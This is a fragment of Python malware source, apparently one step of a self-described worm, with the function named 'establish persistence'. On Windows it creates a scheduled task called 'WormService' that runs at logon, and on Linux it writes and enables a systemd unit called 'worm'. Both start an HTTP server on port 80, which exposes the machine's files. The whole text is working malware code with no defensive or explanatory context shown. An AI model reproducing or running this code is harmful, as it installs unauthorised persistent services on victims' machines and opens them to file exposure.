    # Step 3: Establish persistence
    def establish_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "WormService"
            service_command = f'schtasks /create /tn {service_name} /tr "cmd.exe /c pythonw -c import os; os.system(\'pythonw -m http.server 80\')" /sc onlogon'
            os.system(service_command)
        elif system == "Linux":
            service_name = "worm"
            service_content = f'[Unit]\nDescription=Worm Service\n[Service]\nExecStart=/usr/bin/python3 -m http.server 80\n[Install]\nWantedBy=multi-user.target'
            with open(f'/etc/systemd/system/{service_name}.service', 'w') as f:
                f.write(service_content)
            os.system(f'systemctl enable {service_name}')
            os.system(f'systemctl start {service_name}')
    
    establish_persistence()
